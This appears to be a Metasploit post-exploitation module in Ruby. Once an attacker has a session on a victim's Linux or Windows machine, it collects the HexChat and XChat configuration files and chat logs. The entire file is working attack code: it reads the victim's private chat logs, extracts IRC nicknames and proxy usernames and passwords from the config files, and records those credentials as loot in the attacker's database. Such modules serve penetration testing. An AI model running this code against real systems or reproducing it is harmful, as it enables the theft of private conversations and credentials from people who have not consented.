##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Deprecated

  moved_from 'post/linux/gather/enum_xchat'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Gather HexChat/XChat Enumeration',
        'Description' => %q{
          This module will collect HexChat and XChat's config files and chat logs from the victim's
          machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The
          CONFIGS option can be used to collect information such as channel settings,
          channel/server passwords, etc.  The CHATS option will simply download all the
          .log files.
        },
        'License' => MSF_LICENSE,
        'Author' => ['sinn3r', 'h00die'],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Actions' => [
          ['CONFIGS', { 'Description' => 'Collect config files' } ],
          ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
          ['ALL', { 'Description' => 'Collect both the configs and chat logs' }]
        ],
        'DefaultAction' => 'ALL',
        'References' => [
          ['URL', 'https://hexchat.readthedocs.io/en/latest/settings.html']
        ]
      )
    )
    register_options([
      OptBool.new('HEXCHAT', [false, 'Enumerate hexchat', true ]),
      OptBool.new('XCHAT', [false, 'Enumerate xchat', false ])
    ])
  end

  def whoami
    cmd_exec('/usr/bin/whoami').chomp
  end

  def sep
    if session.platform == 'windows'
      return '\\'
    else
      return '/'
    end
  end

  def get_paths(mode = 'HEXCHAT')
    paths = []
    if session.platform == 'windows'
      appdata = get_env('APPDATA')
      if mode == 'HEXCHAT'
        paths << "#{appdata}\\HexChat\\"
      elsif datastore['XCHAT']
        paths << "#{appdata}\\X-Chat 2\\"
      end
    else
      user = whoami
      fail_with(Failure::Unknown, 'Unable to get username.') if user.blank?
      vprint_status("Detcted username: #{user}")

      if mode == 'HEXCHAT'
        # https://hexchat.readthedocs.io/en/latest/settings.html
        paths << "/home/#{user}/.config/hexchat/"
      elsif mode == 'XCHAT'
        paths << "/home/#{user}/.xchat2/"
      end
    end
    paths
  end

  def list_logs(base, mode = 'HEXCHAT')
    files = []
    if mode == 'HEXCHAT'
      # hexchat has a folder for each server
      # inside each folder, like 'freenode'
      # are files: sever.log, <server>.log, .log
      folders = dir base
      folders.each do |folder|
        file = dir "#{base}#{sep}#{folder}"
        file.each do |f|
          if f.end_with? '.log'
            files << "#{base}#{sep}#{folder}#{sep}#{f}"
          end
        end
      end
    elsif mode == 'XCHAT'
      file = dir base
      file.each do |f|
        if f.end_with? '.log'
          files << "#{base}#{sep}#{f}"
        end
      end
    end
    files
  end

  def save(type, data, mode = 'HEXCHAT')
    case type
    when :configs
      type = "#{mode.downcase}.config"
    when :chatlogs
      type = "#{mode.downcase}.chatlogs"
    end

    data.each do |d|
      fname = ::File.basename(d[:filename])
      p = store_loot(
        type,
        'text/plain',
        session,
        d[:data],
        fname
      )
      print_good("#{fname} saved as #{p}")
    end
  end

  def get_chatlogs(base, mode = 'HEXCHAT')
    logs = []

    case mode
    when 'XCHAT'
      base_logs = "#{base}#{sep}xchatlogs"
    when 'HEXCHAT'
      base_logs = "#{base}#{sep}logs"
    else
      vprint_error("Invalid mode: #{mode}")
      return logs
    end
    unless directory? base_logs
      vprint_error("Chat logs not found at #{base_logs}")
      return logs
    end
    list_logs(base_logs, mode).each do |l|
      vprint_status("Downloading: #{l}")
      data = read_file(l)
      logs << {
        filename: l,
        data: data
      }
    end
    logs
  end

  def parse_config(conf)
    if conf =~ /^irc_user_name = (.+)$/
      print_good "IRC nick: #{Regexp.last_match(1)}"
    end
    if conf =~ /^irc_nick1 = (.+)$/
      print_good "IRC nick1: #{Regexp.last_match(1)}"
    end
    if conf =~ /^irc_nick2 = (.+)$/
      print_good "IRC nick2: #{Regexp.last_match(1)}"
    end
    if conf =~ /^irc_nick3 = (.+)$/
      print_good "IRC nick3: #{Regexp.last_match(1)}"
    end
    /^net_proxy_user = (?<proxyuser>.+)$/ =~ conf
    /^net_proxy_pass = (?<proxypass>.+)$/ =~ conf
    /^net_proxy_host = (?<proxyhost>.+)$/ =~ conf
    /^net_proxy_port = (?<proxyport>.+)$/ =~ conf
    unless proxypass.blank? || proxyuser.blank? || proxyhost.blank? || proxyport.blank?
      proxyhost.strip!
      proxyport.strip!
      proxyuser.strip!
      proxypass.strip!
      print_good("Proxy conf: #{proxyhost}:#{proxyport} -> #{proxyuser}/#{proxypass}")
      create_credential_and_login({
        address: proxyhost,
        port: proxyport,
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        origin_type: :service,
        private_type: :password,
        private_data: proxypass,
        public_data: proxyuser,
        service_name: 'proxy',
        module_fullname: fullname,
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    end
  end

  def get_configs(base, mode = 'HEXCHAT')
    config = []
    files = []
    if mode == 'XCHAT'
      files = ['servlist_.conf', 'xchat.conf']
    elsif mode == 'HEXCHAT'
      files = ['servlist.conf', 'hexchat.conf']
    end
    files.each do |f|
      conf = base + f
      unless file? conf
        vprint_error("File not found: #{conf}")
        next
      end
      vprint_good("Downloading: #{conf}")
      buf = read_file(conf)
      next if buf.blank?

      if conf.end_with? 'chat.conf'
        parse_config buf
      end
      config << {
        filename: f,
        data: buf
      }
    end

    config
  end

  def run
    fail_with(Failure::BadConfig, 'Please specify an action.') if action.nil?

    if datastore['XCHAT']
      get_paths('XCHAT').each do |base|
        unless directory? base
          print_error("XChat not installed or used by user. #{base} not found.")
        end

        configs = get_configs(base, 'XCHAT') if action.name =~ /ALL|CONFIGS/i
        chatlogs = get_chatlogs(base, 'XCHAT') if action.name =~ /ALL|CHATS/i

        save(:configs, configs, 'XCHAT') unless configs.blank?
        save(:chatlogs, chatlogs, 'XCHAT') unless chatlogs.blank?
      end
    end

    if datastore['HEXCHAT']
      get_paths.each do |base|
        unless directory? base
          print_error("HexChat not installed or used by user. #{base} not found.")
        end

        configs = get_configs(base) if action.name =~ /ALL|CONFIGS/i
        chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i

        save(:configs, configs) unless configs.blank?
        save(:chatlogs, chatlogs) unless chatlogs.blank?
      end
    end
  end
end
